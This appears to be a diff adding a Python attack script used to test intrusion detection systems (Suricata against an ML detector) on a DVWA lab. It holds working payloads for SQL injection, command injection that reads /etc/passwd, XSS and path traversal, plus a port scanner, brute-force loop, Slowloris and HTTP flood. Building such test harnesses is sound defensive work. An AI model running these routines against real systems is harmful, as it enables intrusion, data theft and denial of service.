@@ -1,0 +1,455 @@
+#!/usr/bin/env python3
+
+import requests
+import socket
+import time
+import sys
+import threading
+from concurrent.futures import ThreadPoolExecutor
+from urllib.parse import quote
+
+class ComprehensiveAttackSuite:
+    def __init__(self, target_ip, target_port=80):
+        self.target_ip = target_ip
+        self.target_port = target_port
+        self.base_url = f"http://{target_ip}:{target_port}/dvwa"
+        self.session = requests.Session()
+        self.results = {}
+        
+        # Login to DVWA first
+        self.login_dvwa()
+    
+    def login_dvwa(self):
+        """Login to DVWA and get session cookie"""
+        print("[*] Logging into DVWA...")
+        try:
+            # Get login page to obtain CSRF token
+            response = self.session.get(f"{self.base_url}/login.php")
+            
+            # Login with default credentials
+            login_data = {
+                'username': 'admin',
+                'password': 'password',
+                'Login': 'Login'
+            }
+            response = self.session.post(f"{self.base_url}/login.php", data=login_data)
+            
+            # Set security level to low
+            self.session.get(f"{self.base_url}/security.php?security=low")
+            
+            print("[+] Successfully logged into DVWA\n")
+        except Exception as e:
+            print(f"[!] Error logging in: {e}")
+    
+    # ========================================
+    # TEST 1: SQL Injection Attacks
+    # ========================================
+    
+    def test_basic_sqli(self):
+        """Basic SQL Injection (Suricata SHOULD detect)"""
+        print("\n" + "="*70)
+        print("TEST 1A: BASIC SQL INJECTION ATTACKS")
+        print("Expected: Suricata ✓ | ML-IDS ✓")
+        print("="*70)
+        
+        attacks = [
+            ("Classic UNION SELECT", "1' UNION SELECT null,user() #"),
+            ("OR 1=1 bypass", "1' OR '1'='1"),
+            ("Boolean-based blind", "1' AND '1'='1"),
+            ("Comment injection", "1' --"),
+            ("Information schema", "1' UNION SELECT null,table_name FROM information_schema.tables #"),
+        ]
+        
+        success_count = 0
+        for label, payload in attacks:
+            try:
+                url = f"{self.base_url}/vulnerabilities/sqli/?id={payload}&Submit=Submit"
+                print(f"  Testing: {label}")
+                response = self.session.get(url, timeout=5)
+                
+                if response.status_code == 200:
+                    success_count += 1
+                    print(f"    ✓ Payload delivered")
+                else:
+                    print(f"    ✗ Failed ({response.status_code})")
+                
+                time.sleep(0.5)
+            except Exception as e:
+                print(f"    ✗ Error: {e}")
+        
+        self.results['basic_sqli'] = {'total': len(attacks), 'success': success_count}
+        print(f"\nBasic SQLi: {success_count}/{len(attacks)} successful")
+    
+    def test_obfuscated_sqli(self):
+        """Obfuscated SQL Injection (Suricata might MISS, ML should DETECT)"""
+        print("\n" + "="*70)
+        print("TEST 1B: OBFUSCATED SQL INJECTION ATTACKS")
+        print("Expected: Suricata ⚠️ | ML-IDS ✓")
+        print("="*70)
+        
+        attacks = [
+            ("URL encoded UNION", "1%27%20UNION%20SELECT%20null,user()%20%23"),
+            ("Whitespace obfuscation", "1'    UNION    SELECT    null,user() #"),
+            ("Comment obfuscation", "1'/**/UNION/**/SELECT/**/null,user() #"),
+            ("Mixed case", "1' uNiOn SeLeCt null,user() #"),
+            ("Hex encoding", "1' UNION SELECT 0x61646d696e,user() #"),
+            ("Double encoding", "1%2527%2520UNION%2520SELECT%2520null,user()%2520%2523"),
+            ("Null byte injection", "1'%00 UNION SELECT null,user() #"),
+        ]
+        
+        success_count = 0
+        for label, payload in attacks:
+            try:
+                url = f"{self.base_url}/vulnerabilities/sqli/?id={payload}&Submit=Submit"
+                print(f"  Testing: {label}")
+                response = self.session.get(url, timeout=5)
+                
+                if response.status_code == 200:
+                    success_count += 1
+                    print(f"    ✓ Payload delivered")
+                else:
+                    print(f"    ✗ Failed ({response.status_code})")
+                
+                time.sleep(0.5)
+            except Exception as e:
+                print(f"    ✗ Error: {e}")
+        
+        self.results['obfuscated_sqli'] = {'total': len(attacks), 'success': success_count}
+        print(f"\nObfuscated SQLi: {success_count}/{len(attacks)} successful")
+    
+    # ========================================
+    # TEST 2: Command Injection Attacks
+    # ========================================
+    
+    def test_command_injection(self):
+        """Command Injection (Both SHOULD detect)"""
+        print("\n" + "="*70)
+        print("TEST 2: COMMAND INJECTION ATTACKS")
+        print("Expected: Suricata ✓ | ML-IDS ✓")
+        print("="*70)
+        
+        attacks = [
+            ("Semicolon separator", "127.0.0.1; ls -la"),
+            ("Pipe separator", "127.0.0.1 | whoami"),
+            ("AND operator", "127.0.0.1 && cat /etc/passwd"),
+            ("OR operator", "127.0.0.1 || id"),
+            ("Command substitution", "127.0.0.1; echo $(whoami)"),
+            ("Backtick execution", "127.0.0.1; `whoami`"),
+        ]
+        
+        success_count = 0
+        for label, payload in attacks:
+            try:
+                url = f"{self.base_url}/vulnerabilities/exec/?ip={quote(payload)}&Submit=Submit"
+                print(f"  Testing: {label}")
+                response = self.session.get(url, timeout=5)
+                
+                if response.status_code == 200:
+                    success_count += 1
+                    print(f"    ✓ Payload delivered")
+                else:
+                    print(f"    ✗ Failed ({response.status_code})")
+                
+                time.sleep(0.5)
+            except Exception as e:
+                print(f"    ✗ Error: {e}")
+        
+        self.results['command_injection'] = {'total': len(attacks), 'success': success_count}
+        print(f"\nCommand Injection: {success_count}/{len(attacks)} successful")
+    
+    # ========================================
+    # TEST 3: Port Scan Attack
+    # ========================================
+    
+    def test_port_scan(self):
+        """Port Scan (Both SHOULD detect)"""
+        print("\n" + "="*70)
+        print("TEST 3: PORT SCAN ATTACK")
+        print("Expected: Suricata ✓ | ML-IDS ✓")
+        print("="*70)
+        
+        print("[*] Scanning ports 1-1100...")
+        
+        def scan_port(port):
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.1)
+                result = sock.connect_ex((self.target_ip, port))
+                sock.close()
+                return port, result == 0
+            except:
+                return port, False
+        
+        start_time = time.time()
+        with ThreadPoolExecutor(max_workers=100) as executor:
+            results = list(executor.map(scan_port, range(1, 1101)))
+        
+        elapsed = time.time() - start_time
+        open_ports = [port for port, is_open in results if is_open]
+        
+        print(f"  ✓ Scanned 1100 ports in {elapsed:.2f}s")
+        print(f"  Found {len(open_ports)} open ports")
+        
+        self.results['port_scan'] = {'total': 1100, 'time': elapsed}
+    
+    # ========================================
+    # TEST 4: Brute Force Attack
+    # ========================================
+    
+    def test_brute_force(self):
+        """Brute Force (Both SHOULD detect)"""
+        print("\n" + "="*70)
+        print("TEST 4: BRUTE FORCE ATTACK")
+        print("Expected: Suricata ✓ | ML-IDS ✓")
+        print("="*70)
+        
+        print("[*] Attempting 30 rapid login attempts...")
+        
+        success_count = 0
+        for i in range(30):
+            try:
+                login_data = {
+                    'username': f'admin{i}',
+                    'password': f'password{i}',
+                    'Login': 'Login'
+                }
+                response = self.session.post(f"{self.base_url}/vulnerabilities/brute/", data=login_data, timeout=5)
+                
+                if response.status_code == 200:
+                    success_count += 1
+                
+                print(f"  Attempt {i+1}/30", end='\r')
+                time.sleep(0.2)
+            except:
+                pass
+        
+        print(f"\n  ✓ Completed {success_count}/30 attempts")
+        self.results['brute_force'] = {'total': 30, 'success': success_count}
+    
+    # ========================================
+    # TEST 5: XSS Attack
+    # ========================================
+    
+    def test_xss(self):
+        """Cross-Site Scripting (Both SHOULD detect)"""
+        print("\n" + "="*70)
+        print("TEST 5: XSS ATTACKS")
+        print("Expected: Suricata ✓ | ML-IDS ✓")
+        print("="*70)
+        
+        attacks = [
+            ("Basic script tag", "<script>alert('XSS')</script>"),
+            ("IMG onerror", "<img src=x onerror=alert('XSS')>"),
+            ("Event handler", "<body onload=alert('XSS')>"),
+            ("JavaScript protocol", "<a href='javascript:alert(\"XSS\")'>Click</a>"),
+        ]
+        
+        success_count = 0
+        for label, payload in attacks:
+            try:
+                url = f"{self.base_url}/vulnerabilities/xss_r/?name={quote(payload)}"
+                print(f"  Testing: {label}")
+                response = self.session.get(url, timeout=5)
+                
+                if response.status_code == 200:
+                    success_count += 1
+                    print(f"    ✓ Payload delivered")
+                else:
+                    print(f"    ✗ Failed ({response.status_code})")
+                
+                time.sleep(0.5)
+            except Exception as e:
+                print(f"    ✗ Error: {e}")
+        
+        self.results['xss'] = {'total': len(attacks), 'success': success_count}
+        print(f"\nXSS: {success_count}/{len(attacks)} successful")
+    
+    # ========================================
+    # TEST 6: File Inclusion Attack
+    # ========================================
+    
+    def test_file_inclusion(self):
+        """File Inclusion (Both SHOULD detect)"""
+        print("\n" + "="*70)
+        print("TEST 6: FILE INCLUSION ATTACKS")
+        print("Expected: Suricata ✓ | ML-IDS ✓")
+        print("="*70)
+        
+        attacks = [
+            ("Directory traversal", "../../../../../../etc/passwd"),
+            ("Null byte", "../../../../../../etc/passwd%00"),
+            ("PHP wrapper", "php://filter/convert.base64-encode/resource=index.php"),
+        ]
+        
+        success_count = 0
+        for label, payload in attacks:
+            try:
+                url = f"{self.base_url}/vulnerabilities/fi/?page={quote(payload)}"
+                print(f"  Testing: {label}")
+                response = self.session.get(url, timeout=5)
+                
+                if response.status_code == 200:
+                    success_count += 1
+                    print(f"    ✓ Payload delivered")
+                else:
+                    print(f"    ✗ Failed ({response.status_code})")
+                
+                time.sleep(0.5)
+            except Exception as e:
+                print(f"    ✗ Error: {e}")
+        
+        self.results['file_inclusion'] = {'total': len(attacks), 'success': success_count}
+        print(f"\nFile Inclusion: {success_count}/{len(attacks)} successful")
+    
+    # ========================================
+    # TEST 7: Slowloris DoS Attack
+    # ========================================
+    
+    def test_slowloris(self):
+        """Slowloris DoS (Suricata might MISS, ML-IDS SHOULD detect)"""
+        print("\n" + "="*70)
+        print("TEST 7: SLOWLORIS DoS ATTACK")
+        print("Expected: Suricata ❌ | ML-IDS ✓")
+        print("="*70)
+        
+        print("[*] Creating slow HTTP connections...")
+        
+        sockets = []
+        for i in range(50):
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(4)
+                sock.connect((self.target_ip, self.target_port))
+                sock.send(f"GET /?{i} HTTP/1.1\r\n".encode())
+                sock.send("User-Agent: Mozilla/5.0\r\n".encode())
+                sock.send("Accept-language: en-US,en\r\n".encode())
+                sockets.append(sock)
+            except:
+                pass
+        
+        print(f"  ✓ Created {len(sockets)} slow connections")
+        
+        # Keep connections alive with incomplete headers
+        print("[*] Keeping connections alive with slow headers...")
+        for _ in range(10):
+            for sock in sockets:
+                try:
+                    sock.send(f"X-a: {time.time()}\r\n".encode())
+                except:
+                    pass
+            time.sleep(0.5)
+        
+        # Cleanup
+        for sock in sockets:
+            try:
+                sock.close()
+            except:
+                pass
+        
+        print("  ✓ Slowloris attack completed")
+        self.results['slowloris'] = {'sockets': len(sockets)}
+    
+    # ========================================
+    # TEST 8: HTTP Flood Attack
+    # ========================================
+    
+    def test_http_flood(self):
+        """HTTP Flood (Suricata might MISS, ML-IDS SHOULD detect)"""
+        print("\n" + "="*70)
+        print("TEST 8: HTTP FLOOD ATTACK")
+        print("Expected: Suricata ❌ | ML-IDS ✓")
+        print("="*70)
+        
+        print("[*] Sending 200 rapid HTTP requests...")
+        
+        def make_request(_):
+            try:
+                requests.get(f"{self.base_url}/", timeout=2)
+                return True
+            except:
+                return False
+        
+        start_time = time.time()
+        with ThreadPoolExecutor(max_workers=50) as executor:
+            results = list(executor.map(make_request, range(200)))
+        
+        elapsed = time.time() - start_time
+        success = sum(1 for r in results if r)
+        
+        print(f"  ✓ Sent {success}/200 requests in {elapsed:.2f}s")
+        print(f"  Rate: {success/elapsed:.2f} req/s")
+        
+        self.results['http_flood'] = {'total': 200, 'success': success, 'time': elapsed}
+    
+    # ========================================
+    # Main Execution
+    # ========================================
+    
+    def print_summary(self):
+        """Print attack summary"""
+        print("\n" + "="*70)
+        print("ATTACK SUITE SUMMARY")
+        print("="*70)
+        
+        for test, data in self.results.items():
+            print(f"\n{test.upper().replace('_', ' ')}:")
+            for key, value in data.items():
+                print(f"  {key}: {value}")
+        
+        print("\n" + "="*70)
+        print("CHECK THE DASHBOARD TO COMPARE DETECTION RATES!")
+        print("="*70)
+        print("\nExpected Results:")
+        print("✓ Both Detect: SQLi (basic), Command Injection, Port Scan, Brute Force, XSS, File Inclusion")
+        print("✓ ML Advantage: SQLi (obfuscated), Slowloris, HTTP Flood")
+        print("\n")
+    
+    def run_all_attacks(self):
+        """Execute all attack tests"""
+        print("\n" + "="*70)
+        print("COMPREHENSIVE ATTACK SUITE")
+        print(f"Target: {self.base_url}")
+        print("="*70)
+        
+        # Run all tests
+        self.test_basic_sqli()
+        time.sleep(2)
+        
+        self.test_obfuscated_sqli()
+        time.sleep(2)
+        
+        self.test_command_injection()
+        time.sleep(2)
+        
+        self.test_port_scan()
+        time.sleep(2)
+        
+        self.test_brute_force()
+        time.sleep(2)
+        
+        self.test_xss()
+        time.sleep(2)
+        
+        self.test_file_inclusion()
+        time.sleep(2)
+        
+        self.test_slowloris()
+        time.sleep(2)
+        
+        self.test_http_flood()
+        
+        # Print summary
+        self.print_summary()
+
+
+if __name__ == '__main__':
+    if len(sys.argv) < 2:
+        print("Usage: python3 attack_suite.py <target_ip> [port]")
+        print("Example: python3 attack_suite.py 172.18.0.2 80")
+        sys.exit(1)
+    
+    target_ip = sys.argv[1]
+    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
+    
+    attacker = ComprehensiveAttackSuite(target_ip, target_port)
+    attacker.run_all_attacks()
